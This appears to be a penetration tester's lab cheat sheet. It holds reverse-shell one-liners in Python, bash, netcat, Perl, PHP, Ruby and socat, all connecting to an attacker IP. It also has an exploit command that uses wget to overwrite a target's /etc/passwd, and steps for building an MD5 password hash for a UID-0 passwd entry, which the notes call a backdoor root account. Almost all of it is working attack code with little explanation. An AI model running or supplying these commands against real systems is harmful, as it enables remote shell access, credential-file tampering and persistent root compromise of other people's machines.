one cmd shell

  

```SQL
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.245\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
```

```SQL
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.245\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")
```

```SQL
bash -i >& /dev/tcp/192.168.45.245/80 0>&1
nc -e /bin/bash 192.168.45.245 80
perl -e 'use Socket;$i="192.168.45.245";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

```SQL
php -r '$sock=fsockopen("192.168.45.245",80);exec("/bin/bash -i <&3 >&3 2>&3");'
```

```SQL
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.45.245","80");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

```SQL
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.245:80
```

```SQL
bash -c '\''exec 5<>/dev/tcp/192.168.45.245/80;cat <&5 | while read line; do $line 2>&5 >&5; done'\''
```

```SQL
python -c '\''import socket,subprocess;s=socket.socket();s.connect(("192.168.45.245",80));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\''
```

```SQL
python 47984.py 192.168.236.71 25 'wget 192.168.45.245/passwd.bak -O /etc/passwd'
-O /etc/passwd - Output flag that:
- Overwrites the target's /etc/passwd file
- Forces root ownership since the exploit runs as root
```

  

  

```SQL
openssl passwd -1 -salt noah qwert
- openssl passwd - Creates a password hash
- -1 - Uses MD5 hashing algorithm (that's why hash starts with $1$)
- -salt noah - Uses "noah" as the salt value
- qwert - The actual password being hashed
Output: $1$noah$dON8zsUBztMT5DFx8ZhsP/

- $1$ - Indicates MD5 algorithm
- noah - The salt value
- dON8zsUBztMT5DFx8ZhsP/ - The hashed password
```

noah:$1$noah$dON8zsUBztMT5DFx8ZhsP/:0:0:root:/root:/bin/bash

Each field is separated by colons (:):

1. noah - Username
2. $1$noah$dON8zsUBztMT5DFx8ZhsP/ - Password hash:
    - $1$ indicates MD5 hashing
    - noah is the salt
    - Rest is the actual hash
3. 0 - User ID (UID) - root has UID 0
4. 0 - Group ID (GID) - root group has GID 0
5. root - Comment/User Info field
6. /root - Home directory
7. /bin/bash - Default shell  
    This entry is significant because:

- UID and GID of 0 gives root privileges
- Has a login shell (/bin/bash) allowing interactive login
- Located in /root directory like the real root user
- Created as an additional root-level account  
    This is effectively a backdoor root account that was added to the system.

Username "noah" is used as both the username and salt

- noah - This is the actual username
- $1$noah$dON8zsUBztMT5DFx8ZhsP/ - Password hash
- 0 - UID (root level)
- 0 - GID (root group)
- root - Just a comment/description field
- /root - Home directory
- /bin/bash - Login shell